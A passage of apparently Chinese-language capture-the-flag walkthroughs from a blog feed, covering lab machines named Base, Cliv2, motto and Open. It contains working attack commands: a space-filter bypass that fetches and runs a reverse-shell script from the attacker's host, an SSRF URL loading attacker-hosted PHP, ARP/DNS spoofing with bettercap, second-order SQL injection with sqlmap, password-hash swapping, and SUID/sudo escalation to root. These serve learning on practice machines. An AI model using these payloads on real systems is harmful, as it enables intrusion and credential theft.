Disallow: /pivotx/
```

这个应该是cms的主页暂时不管

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ wget http://192.168.205.210/users.db
--2025-07-23 22:27:37--  http://192.168.205.210/users.db
正在连接 192.168.205.210:80... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：12288 (12K)
正在保存至: “users.db”

users.db                                  100%[=====================================================================================&gt;]  12.00K  --.-KB/s  用时 0s      

2025-07-23 22:27:37 (703 MB/s) - 已保存 “users.db” [12288/12288])

                                                                                                                                                                        
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ file users.db 
users.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 2, database pages 3, cookie 0x1, schema 4, UTF-8, version-valid-for 2
                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ file users.db 
users.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 2, database pages 3, cookie 0x1, schema 4, UTF-8, version-valid-for 2
           
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sqlite3 users.db                   
SQLite version 3.46.1 2024-08-13 09:16:08
Enter '.help' for usage hints.
sqlite&gt; .tables
users
sqlite&gt; select * from users;
1|hungry|aHVuZ3J5
```

`aHVuZ3J5`是hungry的base64编码

去找找登录口

发现打开`/pivotx/`就会跳转登录

尝试登录无果，去尝试ssh

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh hungry@192.168.205.210                                                                                                                   
The authenticity of host '192.168.205.210 (192.168.205.210)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
Linux Base 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
 ____                 
| __ )  __ _ ___  ___ 
|  _ \ / _` / __|/ _ \
| |_) | (_| \__ \  __/
|____/ \__,_|___/\___|
                      
hungry@Base:~$ id
uid=1000(hungry) gid=1000(hungry) groups=1000(hungry)
```

登录成功，这里有两个思路

第一个，你可以根据靶机名字base和ssh登录密码发现规律，它使用的密码及其有可能是经过base64编码的，所以你可以将一些字典编码生成有针对性的字典
```
while IFS= read -r line; do
    echo -n '$line' | base64
done &lt; xato-net-10-million-passwords-100000.txt  &gt; 100000base.txt
```

这里为什么使用`xato-net-10-million-passwords-100000.txt`是因为我发现好像我们常见的弱密码在`xato`里面是比较前的，而`rockyou`比较后面，如`admin123`

密码是todd的base64编码，在`xato`的5k+，在`rockyou`的13w左右

第二个方法是横向回www-data

```
hungry@Base:~$ id www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
```

它有一个`adm`组权限，这个权限可以看log日志文件

```
hungry@Base:~$ cd /var/www/html/
hungry@Base:/var/www/html$ ls -al
total 76
drwxr-xr-x  4 root     root      4096 Jul 20 00:52 .
drwxr-xr-x  3 root     root      4096 Apr  4 23:20 ..
-rw-r--r--  1 www-data www-data    27 Jul 20 00:24 creds.txt
-rw-r--r--  1 www-data www-data  3389 Jun 22  2023 example.htaccess
-rw-r--r--  1 www-data www-data  4253 Jun 22  2023 example.web.config
drwxr-xr-x  2 www-data www-data  4096 Jun 22  2023 images
-rw-r--r--  1 www-data www-data   612 Jun 22  2023 index.php
-rw-r--r--  1 www-data www-data 14900 Jun 22  2023 LICENSE.txt
drwxr-xr-x 12 www-data www-data  4096 Jun 22  2023 pivotx
-rw-r--r--  1 www-data www-data   311 Jun 22  2023 README.md
-rw-r--r--  1 www-data www-data    33 Jun 22  2023 robots.txt
-rw-r--r--  1 www-data www-data   956 Jun 22  2023 UPGRADE.txt
-rw-r--r--  1 root     root     12288 Jul 20 00:30 users.db
hungry@Base:/var/www/html$ cat creds.txt 
guest:guest
admin:YWRtaW*=
```

一个是访客密码，没有结果base64编码，一个是admin管理员用户的密码，经过了base64编码，这里就考验你有没有看过base64的`admin`了，当然你爆破也是可以的。web有爆破限制，可以去扒拉`/db/user`文件拿`hash`爆破

```
hungry@Base:/var/www/html$ cd pivotx/db/
hungry@Base:/var/www/html/pivotx/db$ ls -al
total 96
drwxr-xr-x 11 www-data www-data 4096 Jul 20 00:25 .
drwxr-xr-x 12 www-data www-data 4096 Jun 22  2023 ..
drwxrwxrwx  2 www-data www-data 4096 Jul 20 00:25 cache
-rw-r--r--  1 www-data www-data  202 Jun 22  2023 index.html
drwxrwxrwx  2 www-data www-data 4096 Jul 20 00:08 pages
drwxr-xr-x  2 www-data www-data 4096 Jun 22  2023 refkeys
drwxr-xr-x  2 www-data www-data 4096 Jun 22  2023 rsscache
drwxr-xr-x  2 www-data www-data 4096 Jul 20 00:08 search
-rw-rw-rw-  1 www-data www-data  268 Jul 20 00:25 ser-archives.php
-rw-rw-rw-  1 www-data www-data  309 Jul 20 00:09 ser_categories.php
-rw-rw-rw-  1 www-data www-data   90 Jul 20 00:08 ser-cats.php
-rw-rw-rw-  1 www-data www-data 2729 Jul 20 00:08 ser_config.php
-rw-rw-rw-  1 www-data www-data   95 Jul 20 00:08 ser-dates.php
-rw-rw-rw-  1 www-data www-data  389 Jul 20 00:09 ser_events.php
-rw-rw-rw-  1 www-data www-data  165 Jul 20 00:08 ser_logins.php
-rw-rw-rw-  1 www-data www-data  148 Jul 20 00:08 ser_sessions.php
-rw-rw-rw-  1 www-data www-data  118 Jul 23 22:29 ser_tags.php
-rw-rw-rw-  1 www-data www-data  117 Jul 20 00:08 ser-uris.php
-rw-rw-rw-  1 www-data www-data  604 Jul 20 00:09 ser_users.php
-rw-rw-rw-  1 www-data www-data 2692 Jul 23 22:29 ser_weblogs.php
drwxrwxrwx  2 www-data www-data 4096 Jul 20 00:08 standard-00000
drwxr-xr-x  2 www-data www-data 4096 Jul 20 00:08 tagdata
drwxr-xr-x  2 www-data www-data 4096 Jun 22  2023 tbkeys
drwxr-xr-x  2 www-data www-data 4096 Jun 22  2023 users
hungry@Base:/var/www/html/pivotx/db$ cat ser_users.php
&lt;?php /* pivot */ die(); ?&gt;a:2:{i:0;a:10:{s:8:'username';s:5:'admin';s:5:'email';s:15:'admin@admin.com';s:9:'userlevel';i:4;s:8:'nickname';s:4:'root';s:8:'language';s:2:'en';s:5:'image';N;s:15:'text_processing';i:5;s:4:'salt';s:6:'phpass';s:8:'password';s:34:'$P$C4HR7UH4rgIvtiTUko9sm5X2wnXvVe1';s:8:'lastseen';i:1752984498;}i:1;a:9:{s:8:'username';s:5:'guest';s:5:'email';s:15:'guest@admin.com';s:9:'userlevel';s:1:'1';s:8:'nickname';s:5:'guest';s:8:'language';s:2:'en';s:5:'image';s:0:'';s:15:'text_processing';s:1:'5';s:4:'salt';s:6:'phpass';s:8:'password';s:34:'$P$CKuO3Fs4IYzSqVFJi1TCLNSXd3yCaK1';}}
```

或者你直接不爆破了，直接替换`admin`的hash为`guest`的hash，因为`ser_users.php`文件我们有写入的权限，看你喜欢

进去cms之后，在`http://192.168.205.210/pivotx/index.php?page=homeexplore`管理文件页面，直接修改

index.php的内容为蚁剑的ant文件就好了（直接修改成reverce shell和cmd好像不行，它好像有些过滤。或者你根据那个rce的修改，那个是可以的）

kali监听

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888           
listening on [any] 8888 ...
```

使用蚁剑连接，弹shell

稳定shell

```
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

直接扒拉日志

```
www-data@Base:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
www-data@Base:/var/www/html$ cd /var/log
www-data@Base:/var/log$ grep -i -r 'password\|pass\|passwd' auth.log 
Jul 19 23:59:05 moban passwd[528]: pam_unix(passwd:chauthtok): password changed for root
Jul 19 23:58:27 moban sudo[381]: root : password changed to 'dG9kZA==
Jul 20 00:05:17 moban sshd[548]: Accepted password for root from 192.168.3.94 port 60280 ssh2
Jul 20 00:10:50 moban passwd[831]: pam_unix(passwd:chauthtok): password changed for hungry
Jul 20 00:30:55 moban passwd[1026]: pam_unix(passwd:chauthtok): password changed for hungry
Jul 20 00:31:43 moban sshd[1031]: Accepted password for root from 192.168.3.94 port 36218 ssh2
Jul 20 00:32:02 moban passwd[1044]: pam_unix(passwd:chauthtok): password changed for root
Jul 20 00:44:17 Base sshd[433]: Accepted password for root from 192.168.3.94 port 47964 ssh2
Jul 20 00:52:12 Base sshd[433]: Accepted password for root from 192.168.3.94 port 55854 ssh2
Jul 23 22:30:22 Base sshd[583]: Accepted password for hungry from 192.168.205.128 port 34874 ssh2
```

dG9kZA==

登录一下

```
www-data@Base:/var/log$ su -
Password: 
 ____                 
| __ )  __ _ ___  ___ 
|  _ \ / _` / __|/ _ \
| |_) | (_| \__ \  __/
|____/ \__,_|___/\___|
                      
root@Base:~# cat /root/root.txt /home/hungry/user.txt 
flag{root}
flag{user-051a0db9a92e4dacc70212da32fd0638}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Base.html</guid><pubDate>Wed, 06 Aug 2025 00:53:05 +0000</pubDate></item><item><title>内部_Cliv2</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Cliv2.html</link><description>![image-20250803203858485](http://7r1UMPHK.github.io/image/20250803203858632.webp)

# **一、信息收集**

## 1. 主机发现

使用 `arp-scan` 在本地网络进行扫描，发现目标主机 IP 地址为 `192.168.205.240`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.240 08:00:27:aa:bc:4b       PCS Systemtechnik GmbH
...
```

## 2. 端口与服务扫描

通过 `nmap` 对目标主机进行全端口扫描，确认其开放了 22 (SSH), 53 (DNS) 和 80 (HTTP) 端口。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.240
...
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

对 DNS 服务进行版本侦察，确认为 ISC BIND 9.16.50。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p53 -sC -sV 192.168.205.240
...
PORT   STATE SERVICE VERSION
53/tcp open  domain  ISC BIND 9.16.50 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.16.50-Debian
...
```

## 3. Web 与 DNS 侦察

直接访问目标 IP 的 80 端口，页面会自动重定向到域名 `http://cliv2.dsz/`。因此，首先在攻击机上配置 `/etc/hosts` 文件，将该域名指向目标 IP。

```bash
# 在 /etc/hosts 文件中添加
192.168.205.240 cliv2.dsz
```

由于目标开放了 DNS 服务，尝试进行 DNS 区域传送（AXFR）攻击，成功获取了多个子域名。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dig axfr @192.168.205.240 cliv2.dsz
...
cliv2.dsz.              86400   IN      A       127.0.0.1
3170a7.cliv2.dsz.       86400   IN      A       127.0.0.1
client.cliv2.dsz.       86400   IN      A       127.0.0.1
dev.cliv2.dsz.          86400   IN      A       127.0.0.1
ns1.cliv2.dsz.          86400   IN      A       127.0.0.1
...
```

将发现的所有子域名一并添加到 `/etc/hosts` 文件中，以便后续访问。

```bash
# 更新 /etc/hosts 文件
192.168.205.240 cliv2.dsz 3170a7.cliv2.dsz client.cliv2.dsz dev.cliv2.dsz ns1.cliv2.dsz
```

# **二、初始访问**

## Web 渗透 (RCE)

在探测发现的子域名中，访问 `http://3170a7.cliv2.dsz/` 发现一个 Web 终端，该终端允许执行系统命令。

经过测试，后端对输入进行了过滤，禁止了空格和 `-` 等特殊字符。为了绕过空格限制，我们可以使用 shell 的内部字段分隔符 `${IFS}` 来代替。

**攻击步骤:**

1.  在攻击机 (Kali) 上创建一个反弹 shell 脚本 (`reverse.sh`)。
2.  在攻击机上开启一个临时的 HTTP 服务器（例如 `python3 -m http.server 80`）。
3.  在 Kali 上开启 `netcat` 监听。
4.  构造绕过空格限制的恶意命令，下载并执行反弹 shell 脚本。

**恶意命令:**

```bash
cd${IFS}/tmp/;busybox${IFS}wget${IFS}192.168.205.128/reverse.sh;bash${IFS}reverse.sh
```

在 Web 终端执行上述命令后，成功在本地 `netcat` 监听器上接收到了来自目标服务器的 `www-data` 用户反弹 shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.240] 53098
...
www-data@Cliv2:/tmp$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# **三、权限提升**

## 1. 从 `www-data` 到 `bitc0de`

获取初始 shell 后，在 `/home` 目录下发现了用户 `bitc0de`。进一步检查 `/home/bitc0de` 目录，发现一个名为 `...` 的可疑文件。

```bash
www-data@Cliv2:/home/bitc0de$ ls -al
...
-rw-r--r-- 1 root    root      17 Jul 25 23:51 ...
-rw-r--r-- 1 root    root      44 Jul 25 22:35 user.txt
...
www-data@Cliv2:/home/bitc0de$ cat ...
MabEwReOmcpG!123
```

读取该文件内容，获得了一个密码 `MabEwReOmcpG!123`。同时，发现了 `user.txt`，读取后获得第一个 flag。

```bash
www-data@Cliv2:/home/bitc0de$ cat user.txt 
flag{user-60b725f10c9c85c70d97880dfe8191b3}
```

使用获取的密码，成功切换到 `bitc0de` 用户。

```bash
www-data@Cliv2:/home/bitc0de$ su bitc0de
Password: MabEwReOmcpG!123
bitc0de@Cliv2:~$ id
uid=1000(bitc0de) gid=1000(bitc0de) groups=1000(bitc0de)
```

## 2. 从 `bitc0de` 到 `root`

成为 `bitc0de` 用户后，执行 `sudo -l` 发现该用户可以无密码以 `ALL` 权限执行 `/usr/local/bin/hmvcli` 脚本。

```bash
bitc0de@Cliv2:~$ sudo -l
...
User bitc0de may run the following commands on Cliv2:
    (ALL) NOPASSWD: /usr/local/bin/hmvcli
```

分析该 Python 脚本 `/usr/local/bin/hmvcli` 的源代码，发现其中一段存在命令注入漏洞：

```python
...
parser.add_argument('-c', '--config', action='store_true', help='Run the setup script to configure credentials')
args = vars(parser.parse_args())

if args['config']:
    print('[*] Ejecutando script de configuración...')
    subprocess.run(['bash', 'setup.sh'])  
    sys.exit(0)
...
```

当使用 `-c` 或 `--config` 参数运行此脚本时，它会以 `root` 权限（因为我们用了 `sudo`）执行当前目录下的 `setup.sh` 文件。我们可以利用这个逻辑来执行任意命令。

**提权步骤:**

1.  在 `bitc0de` 用户权限下，于任意可写目录（如 `/home/bitc0de` 或 `/tmp`）创建一个名为 `setup.sh` 的文件。
2.  在 `setup.sh` 中写入提权命令，这里我们使用 `chmod +s /bin/bash` 为 `bash` 程序设置 SUID 位，使其在执行时获得文件所有者（即 `root`）的权限。
3.  以 `sudo` 方式运行 `hmvcli` 脚本并带上 `-c` 参数，触发漏洞。
4.  执行 `bash -p` 以 root 权限启动一个新的 shell。

```bash
bitc0de@Cliv2:~$ cd /home/bitc0de
bitc0de@Cliv2:~$ echo 'chmod +s /bin/bash' &gt; setup.sh
bitc0de@Cliv2:~$ sudo /usr/local/bin/hmvcli -c
[*] Ejecutando script de configuración...
bitc0de@Cliv2:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
bitc0de@Cliv2:~$ bash -p
bash-5.0# id
uid=1000(bitc0de) gid=1000(bitc0de) euid=0(root) egid=0(root) groups=0(root),1000(bitc0de)
```

成功获取 `root` 权限。

# **四、夺取旗帜**

获取 `root` 权限后，读取最终的 `root.txt` 旗帜文件。

```bash
bash-5.0# cat /root/root.txt 
flag{root-12f54a96f64443246930da001cafda8b}

bash-5.0# cat /home/bitc0de/user.txt 
flag{user-60b725f10c9c85c70d97880dfe8191b3}
```

至此，所有旗帜均已夺取，渗透测试完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Cliv2.html</guid><pubDate>Wed, 06 Aug 2025 00:52:16 +0000</pubDate></item><item><title>内部_motto</title><link>https://7r1UMPHK.github.io/post/nei-bu-_motto.html</link><description>![image-20250802195125109](http://7r1UMPHK.github.io/image/20250802195134238.webp)

# 一、信息收集

## 1. 主机发现

使用 `arp-scan` 对本地网络进行扫描，识别出目标主机的 IP 地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l               
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.237 08:00:27:C5:BA:A3       PCS Systemtechnik/Oracle VirtualBox virtual NIC
...
```

**目标主机IP：** `192.168.205.237`

## 2. 端口与服务扫描

使用 `nmap` 对目标主机进行全端口扫描，以识别开放的端口及运行的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.237
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.205.237
Host is up (0.0016s latency).
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9090/tcp open  zeus-admin
```

**扫描结果汇总：**

| 端口     | 状态 | 服务              | 推断                                           |
| :------- | :--- | :---------------- | :--------------------------------------------- |
| 22/tcp   | open | ssh               | 远程管理服务，可用于后续登录                   |
| 80/tcp   | open | http              | Web 服务，为一个 JavaScript 小游戏，未发现漏洞 |
| 9090/tcp | open | zeus-admin (http) | 另一个 Web 服务，是本次攻击的主要入口          |

# 二、初始访问与漏洞利用

## Web 渗透 (Port 9090): 二阶 SQL 注入

### 1. 漏洞发现

访问 `http://192.168.205.237:9090`，经过手动功能测试，发现该 Web 应用存在两个关键页面：
*   `/myinfo`：允许已认证用户修改自己的昵称 (`nickname`)。
*   `/mymottos`：显示用户的昵称和座右铭信息。

测试发现，在 `/myinfo` 页面提交的 `nickname` 参数未经过滤就存入了数据库。当用户访问 `/mymottos` 页面时，系统从数据库中读取该昵称并拼接到 SQL 查询中，从而触发了 SQL 注入。这是一个典型的**二阶 SQL 注入 (Second-Order SQL Injection)**。

### 2. sqlmap 漏洞利用

由于该注入需要先在一个页面（`/myinfo`）提交 Payload，然后在另一个页面（`/mymottos`）观察结果，因此需要使用 `sqlmap` 的 `--second-url` 参数进行自动化利用。同时，所有请求都需要有效的 JWT Cookie 进行身份验证，可以通过抓取一个合法的请求包并使用 `-r` 参数加载。

**`sqlmap` 利用步骤：**

1.  **抓取请求包**：使用 Burp Suite 等工具抓取一个从 `/myinfo` 页面修改昵称的 POST 请求，并保存为 `1.txt`。

2.  **获取数据库信息**：
    ```bash
    sqlmap -r 1.txt --batch --second-url 'http://192.168.205.237:9090/mymottos' --dbs
    ```

3.  **获取表信息**：
    ```bash
    sqlmap -r 1.txt --batch --second-url 'http://192.168.205.237:9090/mymottos' -D sql --tables
    ```

4.  **转储凭证数据**：从 `register_infos` 表中转储用户凭证。
    ```bash
    sqlmap -r 1.txt --batch --second-url 'http://192.168.205.237:9090/mymottos' -D sql -T register_infos --dump
    ```

通过上述操作，成功获取到用户 `redbean` 的 SSH 登录凭证。

### 3. 获取初始访问 Shell

使用获取到的凭证，成功通过 SSH 登录到目标主机。

```bash
┌──(kali㉿kali)-[/tmp]
└─$ ssh redbean@192.168.205.237
...
redbean@motto:~$ id
uid=1001(redbean) gid=1001(redbean) groups=1001(redbean)
```

---

# 三、权限提升

## 1. SUID 文件发现与代码审计

登录后，首先搜索系统中的 SUID 文件以寻找提权向量，发现一个非标准的程序 `/opt/run_newsh`。

```bash
redbean@motto:~$ find / -perm -4000 -type f 2&gt;/dev/null
...
/opt/run_newsh
...
```

在 `redbean` 的家目录中发现了一个 `.backup` 文件夹，其中包含了 `run_newsh.c` 和 `new.sh` 的源代码，且文件可读。

*   **`run_newsh.c`**：此 C 程序的功能是设置有效用户ID为 root (`setuid(0)`)，然后执行 `/opt/newsh` 脚本，并将命令行传入的第一个参数 (`argv[1]`) 传递给该脚本。
*   **`new.sh`**：脚本的核心逻辑如下：
    ```bash
    [ '$1' = 'flag' ] &amp;&amp; exit 2
    [ $1 = 'flag' ] &amp;&amp; chmod +s /bin/bash 
    ```

## 2. 漏洞分析：Shell 路径名扩展

上述脚本中存在一个经典的安全漏洞：
*   **第一行 `[ '$1' = 'flag' ]`**：使用了双引号包裹变量 `$1`，这会将其视为一个完整的字符串。因此，`'f*g'` 不会等于 `'flag'`，检查会失败，脚本继续执行。
*   **第二行 `[ $1 = 'flag' ]`**：**没有使用双引号**。当 `$1` 的值包含通配符（如 `*` 或 `?`）时，Shell 会在执行 `[` (test) 命令前进行**路径名扩展**。如果当前目录下存在一个名为 `flag` 的文件，那么 `f*g` 就会被扩展为 `flag`，导致 `[ flag = flag ]` 的判断为真。

## 3. 漏洞利用

利用此特性，可以通过以下步骤为 `/bin/bash` 添加 SUID 位：

1.  **切换到可写目录**：切换到 `/tmp` 目录，以确保我们有权限创建文件，并且避免干扰其他目录结构。
    ```bash
    redbean@motto:~$ cd /tmp
    ```

2.  **创建触发文件**：创建一个名为 `flag` 的文件，为路径名扩展提供匹配目标。
    ```bash
    redbean@motto:/tmp$ touch flag
    ```

3.  **执行SUID程序**：使用一个能匹配到 `flag` 文件的通配符（如 `f*g`）作为参数执行 `/opt/run_newsh`。
    ```bash
    redbean@motto:/tmp$ /opt/run_newsh 'f*g'
    ```
    此命令成功绕过了第一行检查，并在第二行检查时触发了路径名扩展，执行了 `chmod +s /bin/bash`。

4.  **验证并获取 Root Shell**：检查 `/bin/bash` 的权限，确认已设置 SUID 位。然后使用 `-p` 参数启动 `bash` 以保留 `euid`（有效用户ID）为 root。
    ```bash
    redbean@motto:/tmp$ ls -al /bin/bash
    -rwsr-xr-x 1 root root 1168776 ... /bin/bash
    
    redbean@motto:/tmp$ bash -p
    bash-5.0# id
    uid=1001(redbean) gid=1001(redbean) euid=0(root) groups=1001(redbean)
    bash-5.0# whoami
    root
    ```
    成功获取 root 权限的 shell。

---

# 四、夺取旗帜

获取 root 权限后，读取位于用户家目录和 root 目录下的旗帜文件。

```bash
root@motto:/# cat /home/redbean/user.txt
flag{user-flag-placeholder-for-motto-user}

root@motto:/# cat /root/root.txt
flag{root-flag-placeholder-for-motto-root}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_motto.html</guid><pubDate>Wed, 06 Aug 2025 00:52:05 +0000</pubDate></item><item><title>内部_Open</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Open.html</link><description>![image-20250803185538640](http://7r1UMPHK.github.io/image/20250803185538981.webp)

# **一、信息收集**

## 1. 主机发现

使用 `arp-scan` 在本地网络进行扫描，发现目标主机 IP 地址为 `192.168.205.239`。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.239 08:00:27:3b:0f:b3       (Unknown)
...
```

## 2. 端口与服务扫描

通过 `nmap` 对目标主机进行全端口扫描，确认其开放了 22 (SSH) 和 80 (HTTP) 端口。

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.205.239
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## 3. Web 服务侦察

直接访问目标 IP 会自动重定向到域名 `open.dsz`。因此，首先在攻击机上配置 `/etc/hosts` 文件，将该域名指向目标 IP。

```bash
# /etc/hosts 文件中添加
192.168.205.239 open.dsz
```

接着使用 `gobuster` 进行目录枚举，发现了 `info.txt` 和 `info.php` 文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://open.dsz -w ...
...
/index.php            (Status: 200)
/info.txt             (Status: 200)
/info.php             (Status: 200)
...
```

查看 `info.txt` 的内容发现它包含 PHP 代码，这暗示服务器可能存在文件包含或解析漏洞。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://open.dsz/info.txt              
&lt;?php phpinfo();?&gt;
```

# **二、初始访问**

## Web 渗透 (SSRF)

网站主页提供了一个功能，允许通过 URL 参数 `?url=` 来加载指定的页面。

![image-20250803190055070](http://7r1UMPHK.github.io/image/20250803190055290.webp)

经过测试，发现后端对 URL 进行了限制，只允许加载以 `http://open` 开头的地址，并且会解析`info.txt `，那就有一个作弊的方法

```bash
sudo bettercap
set arp.spoof.targets 192.168.205.239
set dns.spoof.domains http://open.cnm
set dns.spoof.address 192.168.205.128
arp.spoof on
dns.spoof on
```

DNS劫持,然后挂一个反弹shell服务

当然这是作弊的方法，正常的思路是这个过滤机制可以通过在 URL 中使用 `@` 符号来绕过，这是一种典型的服务器端请求伪造 (SSRF) 漏洞。我们可以利用此漏洞，使服务器请求并执行我们托管的恶意文件。

**攻击步骤:**
1.  在攻击机 (Kali) 上创建一个反弹 shell 的 PHP 文件 (`reverse.php`)。
2.  在攻击机上开启一个临时的 HTTP 服务器。
3.  构造恶意的 URL，利用 `@` 符号绕过主机验证，并指向攻击机上的反弹 shell 文件。
4.  在 Kali 上开启 `netcat` 监听。

**恶意 URL:**
```
http://open.dsz/?url=http://open.dsz@192.168.205.128/reverse.php
```

访问上述 URL 后，成功在本地 `netcat` 监听器上接收到了来自目标服务器的 `www-data` 用户反弹 shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888       
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.239] 45778
...
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# **三、权限提升**

## 1. 从 `www-data` 到 `miao`

获取初始 shell 后，在 `/home` 目录下发现了 `giao`, `miao`, `xiao` 三个用户。在 `/opt` 目录中，发现了一个具有 SUID 权限的可执行文件 `echo`。

```bash
www-data@Open:/opt$ ls -al
...
-rwsr-sr-x  1 root root 17008 Jul 29 03:06 echo
...
```

通过逆向分析`echo` 文件，发现它存在命令注入漏洞。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4[2]; // [rsp+1Eh] [rbp-232h] BYREF
  _QWORD v5[2]; // [rsp+20h] [rbp-230h] BYREF
  int v6; // [rsp+30h] [rbp-220h]
  char v7[8]; // [rsp+34h] [rbp-21Ch] BYREF
  char dest[524]; // [rsp+40h] [rbp-210h] BYREF
  int v9; // [rsp+24Ch] [rbp-4h]

  if ( setgid(0x3E8u) || setuid(0x3E8u) )
  {
    fwrite('鏉冮檺璁剧疆澶辫触\n', 1uLL, 0x13uLL, stderr);
    return 1;
  }
  else if ( argc &gt; 1 )
  {
    v5[0] = 0xE75B27206F686365LL;
    v5[1] = 0x93BEE8B788E6A894LL;
    v6 = 1571128805;
    strcpy(v7, ': ');
    strcpy(v4, ''');
    strcpy(dest, (const char *)v5);
    strcat(dest, argv[1]);
    strcat(dest, v4);
    printf(asc_2047, dest);
    v9 = system(dest);
    if ( v9 == -1 )
    {
      perror(s);
      return 1;
    }
    else
    {
      return 0;
    }
  }
  else
  {
    printf('浣跨敤鏂规硶: %s \'瑕佸洖鏄剧殑娑堟伅\'\n', *argv);
    return 1;
  }
}
```

该程序会将其获取的命令行参数直接拼接到一个系统命令字符串中并执行，并且会以用户 `miao` (UID 1000) 的权限运行。

利用此漏洞，通过注入 `bash -p` 命令，我们成功获得了一个拥有 `miao` 用户权限的 shell。

```bash
www-data@Open:/opt$ ./echo ''; id; whoami #'
执行命令: echo '[用户输入]: '; id; whoami #'
[用户输入]: 
uid=1000(miao) gid=1000(miao) groups=1000(miao),33(www-data)
miao

www-data@Open:/opt$ ./echo ''; bash -p #'
执行命令: echo '[用户输入]: '; bash -p #'
[用户输入]: 
miao@Open:/opt$ id
uid=1000(miao) gid=1000(miao) groups=1000(miao),33(www-data)
```

同时，在 `miao` 的家目录下，找到了第一个 flag 文件 `user.txt`。

```bash
miao@Open:/opt$ cat /home/miao/user.txt 
flag{user-b026324c6904b2a9cb4b88d6d61c81d1}
```

#### 2. 从 `miao` 到 `root`

成为 `miao` 用户后，执行 `sudo -l` 发现该用户可以无密码执行 `/opt/hello.sh` 脚本。

```bash
miao@Open:/opt$ sudo -l
...
User miao may run the following commands on Open:
    (ALL) NOPASSWD: /opt/hello.sh
```

查看该脚本内容，发现它对输入参数 'dsz' 做了判断。如果参数完全等于 'dsz'，脚本会直接退出。然而，脚本使用了 `[ $1 = 'dsz' ]` 这种不严谨的判断方式。

```bash
miao@Open:/opt$ cat hello.sh 
PATH=/usr/bin
[ -n '$1' ] || exit 1
[ '$1' = 'dsz' ] &amp;&amp; exit 2
#[ $1 = 'dsz' ] &amp;&amp; cat /root/password.txt | md5sum | awk '{print $1}'
[ $1 = 'dsz' ] &amp;&amp; cat /root/password.txt
echo 'Goodbye!'
```

我们可以通过 `bash` 的通配符扩展（globbing）来绕过这个检查。
1.  在 `/tmp` 目录下创建一个名为 `'dsz '`（注意末尾有空格）的文件。
2.  执行 `sudo /opt/hello.sh *`，此时 `*` 会被 shell 扩展为文件名 `'dsz '`，从而绕过了 `[ '$1' = 'dsz' ]` 的检查，并成功执行了 `cat /root/password.txt` 命令。

```bash
miao@Open:/tmp$ touch 'dsz '
miao@Open:/tmp$ sudo /opt/hello.sh *
6cd1f22e65d26246530ff7a2528144e3
Goodbye!
```

我们得到了一个 MD5 哈希。值得注意的是，脚本中获取哈希的方式是 `cat /root/password.txt | md5sum`，这意味着被哈希的原始密码字符串末尾会包含一个换行符 (`\n`)。

使用自定义的 Python 脚本，针对包含换行符的密码进行爆破，最终成功破解出 `root` 用户的密码为 `do167watt041`。

```python
import threading
import hashlib

f = '/usr/share/wordlists/rockyou.txt'
h = '6cd1f22e65d26246530ff7a2528144e3'
fnd = False
